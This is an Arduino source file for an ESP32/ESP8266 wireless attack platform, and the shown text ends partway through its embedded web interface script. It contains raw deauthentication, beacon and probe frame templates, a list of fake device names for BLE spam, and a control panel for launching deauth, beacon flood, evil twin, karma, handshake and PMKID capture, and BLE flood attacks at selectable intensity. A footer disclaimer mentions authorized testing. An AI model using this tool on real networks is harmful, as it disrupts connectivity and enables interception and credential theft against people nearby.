
/*
 * Advanced WiFi & BLE Security Testing Platform
 * Developed by 0x0806
 * ESP32/ESP8266 Compatible - Full Featured
 * Version: 3.0 - Production Ready
 */

// Platform Detection and Includes
#ifdef ESP32
  #define PLATFORM_ESP32
  #include <WiFi.h>
  #include <WebServer.h>
  #include <DNSServer.h>
  #include <SPIFFS.h>
  #include <esp_wifi.h>
  #include <esp_wifi_types.h>
  #include <esp_bt.h>
  #include <esp_bt_main.h>
  #include <esp_gap_ble_api.h>
  #include <esp_gatts_api.h>
  #include <BLEDevice.h>
  #include <BLEServer.h>
  #include <BLEUtils.h>
  #include <BLE2902.h>
  #include <ArduinoJson.h>
  #include <nvs_flash.h>
  #include <esp_task_wdt.h>
#else
  #define PLATFORM_ESP8266
  #include <ESP8266WiFi.h>
  #include <ESP8266WebServer.h>
  #include <ESP8266mDNS.h>
  #include <DNSServer.h>
  #include <FS.h>
  #include <ArduinoJson.h>
  extern "C" {
    #include "user_interface.h"
    #include "c_types.h"
  }
  typedef ESP8266WebServer WebServer;
#endif

// Configuration Constants
const char* AP_SSID = "SecurityTester_0x0806";
const char* AP_PASS = "pwned123456";
const uint8_t AP_CHANNEL = 6;
const IPAddress AP_IP(192, 168, 4, 1);
const IPAddress SUBNET(255, 255, 255, 0);
const IPAddress GATEWAY(192, 168, 4, 1);

// Core Objects
WebServer server(80);
DNSServer dnsServer;

// Attack Statistics Structure
struct AttackStats {
  uint32_t deauth_sent = 0;
  uint32_t beacon_sent = 0;
  uint32_t probe_sent = 0;
  uint32_t handshakes_captured = 0;
  uint32_t pmkid_captured = 0;
  uint32_t ble_spam_sent = 0;
  uint32_t evil_twin_connections = 0;
  uint32_t karma_probes = 0;
  uint32_t packets_monitored = 0;
  uint32_t clients_connected = 0;
  unsigned long uptime = 0;
  float memory_usage = 0;
  float cpu_usage = 0;
};

// Global State Variables
AttackStats stats;
volatile bool attack_running = false;
volatile bool ap_running = false;
volatile bool ble_running = false;
volatile bool monitoring_active = false;
String selected_network = "";
String selected_bssid = "";
uint8_t selected_channel = 1;
String attack_type = "none";
unsigned long last_attack_time = 0;
unsigned long attack_interval = 100;

// Network Information Structure
struct NetworkInfo {
  String ssid;
  String bssid;
  int32_t rssi;
  uint32_t channel;
  uint8_t encryption;
  bool hidden;
  uint32_t last_seen;
};

// Data Storage
std::vector<NetworkInfo> scanned_networks;
std::vector<String> target_networks;
std::vector<String> ble_devices;
std::vector<String> connected_clients;

// BLE Configuration
#ifdef PLATFORM_ESP32
BLEServer* pServer = nullptr;
BLECharacteristic* pCharacteristic = nullptr;
bool ble_device_connected = false;
uint32_t ble_spam_counter = 0;

// Enhanced BLE Device Names for Spam
const char* ble_spam_names[] = {
  "AirPods Pro Max", "Galaxy Buds Pro", "Sony WH-1000XM5", "Beats Studio3",
  "iPhone 14 Pro", "Samsung S23 Ultra", "MacBook Pro M2", "iPad Pro 12.9",
  "Apple Watch S8", "Tesla Model S", "Smart TV Samsung", "Gaming Headset",
  "Wireless Mouse", "Magic Keyboard", "Surface Pro 9", "Dell XPS 13",
  "HP Spectre x360", "Lenovo ThinkPad", "Google Pixel 7", "OnePlus 11",
  "Xiaomi Mi 13", "Huawei P60", "Nothing Phone", "Steam Deck",
  "Nintendo Switch", "PS5 Controller", "Xbox Series X", "VR Headset",
  "Smart Watch", "Fitness Tracker", "Bluetooth Speaker", "Car Audio"
};
const int ble_spam_count = sizeof(ble_spam_names) / sizeof(ble_spam_names[0]);
#endif

// WiFi Packet Templates
uint8_t deauth_packet_template[26] = {
  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
};

uint8_t beacon_packet_template[128] = {
  0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x64, 0x00, 0x01, 0x04
};

uint8_t probe_packet_template[64] = {
  0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0x00, 0x00
};

// HTML Content stored in PROGMEM to save RAM
const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurityTester 0x0806 - Professional Platform</title>
    <style>
        :root {
            --primary-color: #e94560;
            --secondary-color: #00d4aa;
            --dark-bg: #0f0f23;
            --dark-card: #1a1a2e;
            --darker-card: #16213e;
            --text-primary: #ffffff;
            --text-secondary: #b8b8b8;
            --border-color: #333;
            --success-color: #00ff88;
            --warning-color: #ffaa00;
            --error-color: #ff3366;
            --gradient-primary: linear-gradient(135deg, #e94560 0%, #0f3460 100%);
            --gradient-secondary: linear-gradient(135deg, #00d4aa 0%, #007b5e 100%);
            --box-shadow: 0 8px 32px rgba(233, 69, 96, 0.3);
            --border-radius: 12px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.05;
        }

        .header {
            background: rgba(15, 15, 35, 0.95);
            backdrop-filter: blur(20px);
            border-bottom: 2px solid var(--primary-color);
            padding: 1.5rem 2rem;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: var(--box-shadow);
        }

        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            font-size: 2.2rem;
            font-weight: 700;
            background: var(--gradient-secondary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px var(--secondary-color);
            animation: logoGlow 3s ease-in-out infinite alternate;
        }

        @keyframes logoGlow {
            from { filter: drop-shadow(0 0 10px var(--secondary-color)); }
            to { filter: drop-shadow(0 0 20px var(--secondary-color)); }
        }

        .header-stats {
            display: flex;
            gap: 2rem;
            align-items: center;
        }

        .stat-chip {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid var(--primary-color);
            border-radius: 20px;
            padding: 0.5rem 1rem;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .card {
            background: rgba(26, 26, 46, 0.9);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 2rem;
            backdrop-filter: blur(10px);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: var(--gradient-primary);
            transform: scaleX(0);
            transition: transform 0.3s ease;
        }

        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 20px 40px rgba(233, 69, 96, 0.4);
            border-color: var(--secondary-color);
        }

        .card:hover::before {
            transform: scaleX(1);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .card-title {
            font-size: 1.4rem;
            font-weight: 600;
            color: var(--secondary-color);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .card-badge {
            background: var(--gradient-primary);
            color: white;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.75rem;
            font-weight: 600;
        }

        .btn {
            background: var(--gradient-primary);
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
            width: 100%;
            margin: 0.5rem 0;
            position: relative;
            overflow: hidden;
            min-height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }

        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .btn.success {
            background: var(--gradient-secondary);
        }

        .btn.danger {
            background: linear-gradient(135deg, var(--error-color) 0%, #8b0000 100%);
        }

        .btn.warning {
            background: linear-gradient(135deg, var(--warning-color) 0%, #cc7700 100%);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .input-group {
            margin: 1rem 0;
        }

        .input-group label {
            display: block;
            color: var(--secondary-color);
            margin-bottom: 0.5rem;
            font-weight: 600;
            font-size: 0.9rem;
        }

        .input-group input,
        .input-group select {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid var(--border-color);
            border-radius: 8px;
            background: rgba(15, 15, 35, 0.8);
            color: var(--text-primary);
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .input-group input:focus,
        .input-group select:focus {
            outline: none;
            border-color: var(--secondary-color);
            box-shadow: 0 0 15px rgba(0, 212, 170, 0.3);
        }

        .network-list {
            max-height: 350px;
            overflow-y: auto;
            margin-top: 1rem;
        }

        .network-item {
            padding: 1rem;
            margin: 0.5rem 0;
            background: rgba(15, 15, 35, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .network-item:hover {
            background: rgba(233, 69, 96, 0.2);
            border-color: var(--primary-color);
            transform: translateX(5px);
        }

        .network-item.selected {
            background: rgba(0, 212, 170, 0.2);
            border-color: var(--secondary-color);
            box-shadow: 0 0 15px rgba(0, 212, 170, 0.3);
        }

        .network-ssid {
            font-weight: 600;
            font-size: 1.1rem;
            margin-bottom: 0.3rem;
        }

        .network-details {
            font-size: 0.85rem;
            color: var(--text-secondary);
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .signal-strength {
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }

        .signal-bars {
            display: flex;
            gap: 1px;
            align-items: end;
        }

        .signal-bar {
            width: 3px;
            background: var(--text-secondary);
            border-radius: 1px;
        }

        .signal-bar.active {
            background: var(--success-color);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .stat-item {
            text-align: center;
            padding: 1.5rem 1rem;
            background: rgba(15, 15, 35, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .stat-item:hover {
            background: rgba(233, 69, 96, 0.1);
            border-color: var(--primary-color);
        }

        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: var(--secondary-color);
            margin-bottom: 0.5rem;
            font-family: 'Courier New', monospace;
        }

        .stat-label {
            font-size: 0.8rem;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-indicator {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            margin: 0.5rem 0;
            background: rgba(15, 15, 35, 0.6);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--primary-color);
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .status-indicator.active {
            border-left-color: var(--success-color);
            background: rgba(0, 255, 136, 0.05);
        }

        .status-indicator.warning {
            border-left-color: var(--warning-color);
            background: rgba(255, 170, 0, 0.05);
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--primary-color);
            animation: pulse 2s infinite;
        }

        .status-dot.active {
            background: var(--success-color);
        }

        .status-dot.warning {
            background: var(--warning-color);
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .log-container {
            background: rgba(15, 15, 35, 0.9);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1rem;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', monospace;
            font-size: 0.85rem;
            line-height: 1.4;
        }

        .log-entry {
            margin: 0.3rem 0;
            padding: 0.2rem 0;
            color: var(--secondary-color);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .log-entry.error {
            color: var(--error-color);
        }

        .log-entry.warning {
            color: var(--warning-color);
        }

        .log-entry.success {
            color: var(--success-color);
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--secondary-color);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
            margin: 1rem 0;
        }

        .progress-fill {
            height: 100%;
            background: var(--gradient-primary);
            width: 0%;
            transition: width 0.3s ease;
            animation: progressGlow 2s ease-in-out infinite alternate;
        }

        @keyframes progressGlow {
            from { box-shadow: 0 0 5px var(--primary-color); }
            to { box-shadow: 0 0 15px var(--primary-color); }
        }

        .footer {
            background: rgba(15, 15, 35, 0.95);
            border-top: 1px solid var(--border-color);
            padding: 2rem;
            text-align: center;
            color: var(--text-secondary);
            margin-top: 3rem;
        }

        .footer-content {
            max-width: 1400px;
            margin: 0 auto;
        }

        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
        }

        .grid-3 {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 2rem;
        }

        @media (max-width: 1200px) {
            .grid-3 {
                grid-template-columns: 1fr 1fr;
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .dashboard-grid,
            .grid-2,
            .grid-3 {
                grid-template-columns: 1fr;
            }
            
            .header-content {
                flex-direction: column;
                text-align: center;
            }
            
            .header-stats {
                justify-content: center;
                flex-wrap: wrap;
            }
            
            .logo {
                font-size: 1.8rem;
            }
            
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 480px) {
            .card {
                padding: 1rem;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
        }

        .attack-controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--dark-card);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1rem 1.5rem;
            color: var(--text-primary);
            z-index: 3000;
            transform: translateX(400px);
            transition: transform 0.3s ease;
            max-width: 300px;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast.success {
            border-left: 4px solid var(--success-color);
        }

        .toast.error {
            border-left: 4px solid var(--error-color);
        }

        .toast.warning {
            border-left: 4px solid var(--warning-color);
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrix-canvas"></div>
    
    <div class="header">
        <div class="header-content">
            <div>
                <div class="logo">SecurityTester 0x0806</div>
                <div style="font-size: 0.9rem; opacity: 0.8; margin-top: 0.3rem;">
                    Advanced WiFi & BLE Security Platform
                </div>
            </div>
            <div class="header-stats">
                <div class="stat-chip">
                    <span id="platform-info">Platform: Loading...</span>
                </div>
                <div class="stat-chip">
                    <span id="uptime-display">Uptime: 00:00:00</span>
                </div>
                <div class="stat-chip">
                    <span id="memory-usage">RAM: 0%</span>
                </div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="dashboard-grid">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Network Scanner</h3>
                    <span class="card-badge" id="scan-badge">Ready</span>
                </div>
                <div class="attack-controls">
                    <button class="btn success" onclick="scanNetworks()" id="scan-btn">
                        <span id="scan-text">Scan Networks</span>
                        <div id="scan-loading" class="loading-spinner" style="display: none;"></div>
                    </button>
                    <button class="btn" onclick="scanBLE()" id="ble-scan-btn">
                        <span>Scan BLE</span>
                    </button>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="scan-progress"></div>
                </div>
                <div class="network-list" id="network-list">
                    <div style="text-align: center; padding: 2rem; color: var(--text-secondary);">
                        Click "Scan Networks" to discover targets
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Attack Controls</h3>
                    <span class="card-badge" id="attack-badge">Standby</span>
                </div>
                <div class="input-group">
                    <label for="attack-type">Attack Vector</label>
                    <select id="attack-type">
                        <option value="deauth">Deauthentication Attack</option>
                        <option value="beacon">Beacon Flood</option>
                        <option value="probe">Probe Request Spam</option>
                        <option value="evil_twin">Evil Twin AP</option>
                        <option value="karma">Karma Attack</option>
                        <option value="handshake">Handshake Capture</option>
                        <option value="pmkid">PMKID Capture</option>
                        <option value="monitor">Packet Monitor</option>
                        <option value="ble_spam">BLE Device Spam</option>
                        <option value="ble_flood">BLE Beacon Flood</option>
                    </select>
                </div>
                <div class="input-group">
                    <label for="attack-intensity">Attack Intensity</label>
                    <select id="attack-intensity">
                        <option value="low">Low (100ms interval)</option>
                        <option value="medium" selected>Medium (50ms interval)</option>
                        <option value="high">High (10ms interval)</option>
                        <option value="extreme">Extreme (1ms interval)</option>
                    </select>
                </div>
                <div class="attack-controls">
                    <button class="btn danger" onclick="startAttack()" id="attack-start-btn">
                        Launch Attack
                    </button>
                    <button class="btn" onclick="stopAttack()" id="attack-stop-btn">
                        Stop Attack
                    </button>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="attack-progress"></div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">System Status</h3>
                    <span class="card-badge">Live</span>
                </div>
                <div class="status-indicator active" id="ap-status">
                    <span>Access Point: Active</span>
                    <div class="status-dot active"></div>
                </div>
                <div class="status-indicator" id="wifi-status">
                    <span>WiFi Attack: Standby</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator" id="ble-status">
                    <span>BLE Attack: Standby</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator" id="monitor-status">
                    <span>Packet Monitor: Inactive</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator active" id="web-status">
                    <span>Web Interface: Online</span>
                    <div class="status-dot active"></div>
                </div>
            </div>
        </div>

        <div class="grid-2">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Attack Statistics</h3>
                    <button class="btn" onclick="resetStats()">Reset</button>
                </div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="deauth-count">0</div>
                        <div class="stat-label">Deauth Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="beacon-count">0</div>
                        <div class="stat-label">Beacons Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="probe-count">0</div>
                        <div class="stat-label">Probes Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="handshake-count">0</div>
                        <div class="stat-label">Handshakes</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="ble-count">0</div>
                        <div class="stat-label">BLE Spam</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="clients-count">0</div>
                        <div class="stat-label">Connected</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Activity Monitor</h3>
                    <button class="btn" onclick="clearLogs()">Clear</button>
                </div>
                <div class="log-container" id="log-container">
                    <div class="log-entry success">System initialized - SecurityTester 0x0806</div>
                    <div class="log-entry">Access Point started successfully</div>
                    <div class="log-entry">Web interface ready on port 80</div>
                    <div class="log-entry">Platform detection completed</div>
                    <div class="log-entry">All systems operational</div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-content">
            <p style="font-size: 1.1rem; margin-bottom: 0.5rem;">
                <strong>SecurityTester 0x0806</strong> - Professional Security Testing Platform
            </p>
            <p style="opacity: 0.7;">
                Developed by 0x0806 | For Educational and Authorized Testing Only
            </p>
            <p style="font-size: 0.8rem; margin-top: 1rem; opacity: 0.5;">
                Use responsibly and in compliance with local laws and regulations
            </p>
        </div>
    </div>

    <div id="toast" class="toast">
        <div id="toast-message"></div>
    </div>

    <script>
        var scanInterval, statsInterval, uptimeInterval;
        var isScanning = false;
        var isAttacking = false;
        var selectedNetwork = null;
        var systemUptime = 0;

        function initMatrix() {
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            document.getElementById("matrix-canvas").appendChild(canvas);

            var chars = "0x0806ABCDEFabcdef0123456789";
            var fontSize = 14;
            var columns = canvas.width / fontSize;
            var drops = [];

            for (var x = 0; x < columns; x++) {
                drops[x] = 1;
            }

            function draw() {
                ctx.fillStyle = "rgba(15, 15, 35, 0.08)";
                ctx.fillRect(0, 0, canvas.width, canvas.height);

                ctx.fillStyle = "#e94560";
                ctx.font = fontSize + "px monospace";

                for (var i = 0; i < drops.length; i++) {
                    var text = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }

            setInterval(draw, 50);

            window.addEventListener("resize", function() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        }

        function showToast(message, type) {
            type = type || "info";
            var toast = document.getElementById("toast");
            var toastMessage = document.getElementById("toast-message");
            
            toastMessage.textContent = message;
            toast.className = "toast " + type + " show";
            
            setTimeout(function() {
                toast.classList.remove("show");
            }, 3000);
        }

        function addLog(message, type) {
            type = type || "info";
            var logContainer = document.getElementById("log-container");
            var logEntry = document.createElement("div");
            logEntry.className = "log-entry " + type;
            logEntry.innerHTML = '<span style="opacity: 0.6;">[' + new Date().toLocaleTimeString() + ']</span> ' + message;
            
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;

            while (logContainer.children.length > 50) {
                logContainer.removeChild(logContainer.firstChild);
            }
        }

        function updateProgress(elementId, percentage) {
            var progressBar = document.getElementById(elementId);
            if (progressBar) {
                progressBar.style.width = percentage + "%";
            }
        }

        function scanNetworks() {
            if (isScanning) return;
            
            isScanning = true;
            var scanBtn = document.getElementById("scan-btn");
            var scanText = document.getElementById("scan-text");
            var scanLoading = document.getElementById("scan-loading");
            var scanBadge = document.getElementById("scan-badge");
            
            scanText.style.display = "none";
            scanLoading.style.display = "inline-block";
            scanBtn.disabled = true;
            scanBadge.textContent = "Scanning";
            
            addLog("Starting comprehensive network scan...", "info");
            
            var progressCounter = 0;
            var progressInterval = setInterval(function() {
                if (progressCounter <= 100) {
                    updateProgress("scan-progress", progressCounter);
                    progressCounter += 5;
                } else {
                    clearInterval(progressInterval);
                }
            }, 100);

            fetch("/scan")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    updateNetworkList(data.networks || []);
                    addLog("Network scan completed - Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
                    showToast("Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
                })
                .catch(function(error) {
                    addLog("Network scan failed: " + error.message, "error");
                    showToast("Scan failed: " + error.message, "error");
                })
                .finally(function() {
                    scanText.style.display = "inline-block";
                    scanLoading.style.display = "none";
                    scanBtn.disabled = false;
                    scanBadge.textContent = "Ready";
                    updateProgress("scan-progress", 0);
                    isScanning = false;
                });
        }

        function updateNetworkList(networks) {
            var list = document.getElementById("network-list");
            list.innerHTML = "";
            
            if (networks.length === 0) {
                list.innerHTML = '<div style="text-align: center; padding: 2rem; color: var(--text-secondary);">No networks found. Try scanning again.</div>';
                return;
            }
            
            networks.forEach(function(network, index) {
                var item = document.createElement("div");
                item.className = "network-item";
                item.onclick = function() { selectNetwork(network, item); };
                
                var signalStrength = Math.abs(network.rssi);
                var signalLevel = signalStrength > 70 ? 1 : signalStrength > 50 ? 2 : signalStrength > 30 ? 3 : 4;
                
                var signalBars = "";
                for (var i = 0; i < 4; i++) {
                    var isActive = i < signalLevel ? "active" : "";
                    var height = (i + 1) * 3;
                    signalBars += '<div class="signal-bar ' + isActive + '" style="height: ' + height + 'px;"></div>';
                }
                
                item.innerHTML = 
                    '<div class="network-ssid">' + (network.ssid || "Hidden Network") + '</div>' +
                    '<div class="network-details">' +
                        '<span>CH: ' + network.channel + '</span>' +
                        '<span>Security: ' + network.encryption + '</span>' +
                        '<div class="signal-strength">' +
                            '<span>' + network.rssi + ' dBm</span>' +
                            '<div class="signal-bars">' + signalBars + '</div>' +
                        '</div>' +
                    '</div>' +
                    '<div style="font-size: 0.75rem; opacity: 0.6; margin-top: 0.3rem;">' +
                        'BSSID: ' + network.bssid +
                    '</div>';
                
                list.appendChild(item);
            });
        }

        function selectNetwork(network, element) {
            var items = document.querySelectorAll(".network-item");
            for (var i = 0; i < items.length; i++) {
                items[i].classList.remove("selected");
            }
            element.classList.add("selected");
            selectedNetwork = network;
            
            addLog("Target selected: " + (network.ssid || "Hidden") + " (" + network.bssid + ")", "info");
            showToast("Target: " + (network.ssid || "Hidden"), "info");
        }

        function startAttack() {
            var attackType = document.getElementById("attack-type").value;
            var intensity = document.getElementById("attack-intensity").value;
            
            if (!selectedNetwork && attackType.indexOf("ble") === -1) {
                showToast("Please select a target network first", "warning");
                return;
            }
            
            if (isAttacking) {
                showToast("Attack already in progress", "warning");
                return;
            }
            
            isAttacking = true;
            var attackBtn = document.getElementById("attack-start-btn");
            var attackBadge = document.getElementById("attack-badge");
            
            attackBtn.disabled = true;
            attackBadge.textContent = "Active";
            
            addLog("Starting " + attackType + " attack with " + intensity + " intensity...", "warning");
            
            var requestData = {
                type: attackType,
                target: selectedNetwork ? selectedNetwork.ssid : "",
                bssid: selectedNetwork ? selectedNetwork.bssid : "",
                channel: selectedNetwork ? selectedNetwork.channel : 0,
                intensity: intensity
            };

            fetch("/attack/start", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData)
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                if (data.success) {
                    addLog(attackType + " attack launched successfully", "success");
                    showToast("Attack started successfully", "success");
                    updateStatus("wifi-status", "WiFi Attack: Active", true);
                    startAttackProgress();
                } else {
                    throw new Error(data.error || "Unknown error");
                }
            })
            .catch(function(error) {
                addLog("Failed to start attack: " + error.message, "error");
                showToast("Attack failed: " + error.message, "error");
                isAttacking = false;
                attackBtn.disabled = false;
                attackBadge.textContent = "Standby";
            });
        }

        function stopAttack() {
            fetch("/attack/stop", { method: "POST" })
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    addLog("Attack stopped by user", "info");
                    showToast("Attack stopped", "info");
                    
                    isAttacking = false;
                    document.getElementById("attack-start-btn").disabled = false;
                    document.getElementById("attack-badge").textContent = "Standby";
                    updateStatus("wifi-status", "WiFi Attack: Standby", false);
                    updateStatus("ble-status", "BLE Attack: Standby", false);
                    updateProgress("attack-progress", 0);
                })
                .catch(function(error) {
                    addLog("Failed to stop attack: " + error.message, "error");
                    showToast("Failed to stop attack", "error");
                });
        }

        function startAttackProgress() {
            var progress = 0;
            var interval = setInterval(function() {
                if (!isAttacking) {
                    clearInterval(interval);
                    updateProgress("attack-progress", 0);
                    return;
                }
                
                progress = (progress + 2) % 100;
                updateProgress("attack-progress", progress);
            }, 100);
        }

        function updateStatus(elementId, text, active) {
            var element = document.getElementById(elementId);
            if (element) {
                element.querySelector("span").textContent = text;
                var dot = element.querySelector(".status-dot");
                
                if (active) {
                    element.classList.add("active");
                    dot.classList.add("active");
                } else {
                    element.classList.remove("active");
                    dot.classList.remove("active");
                }
            }
        }

        function updateStats() {
            fetch("/stats")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById("deauth-count").textContent = data.deauth_sent || 0;
                    document.getElementById("beacon-count").textContent = data.beacon_sent || 0;
                    document.getElementById("probe-count").textContent = data.probe_sent || 0;
                    document.getElementById("handshake-count").textContent = data.handshakes_captured || 0;
                    document.getElementById("ble-count").textContent = data.ble_spam_sent || 0;
                    document.getElementById("clients-count").textContent = data.clients_connected || 0;
                    
                    if (data.memory_usage !== undefined) {
                        document.getElementById("memory-usage").textContent = "RAM: " + data.memory_usage.toFixed(1) + "%";
                    }
                })
                .catch(function(error) {
                    console.error("Failed to update stats:", error);
                });
        }

        function updateUptime() {
            systemUptime++;
            var hours = Math.floor(systemUptime / 3600);
            var minutes = Math.floor((systemUptime % 3600) / 60);
            var seconds = systemUptime % 60;
            
            var uptimeStr = 
                String(hours).padStart(2, "0") + ":" +
                String(minutes).padStart(2, "0") + ":" +
                String(seconds).padStart(2, "0");
                
            document.getElementById("uptime-display").textContent = "Uptime: " + uptimeStr;
        }

        function getPlatformInfo() {
            fetch("/info")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById("platform-info").textContent = "Platform: " + (data.platform || "Unknown");
                    
                    if (data.features) {
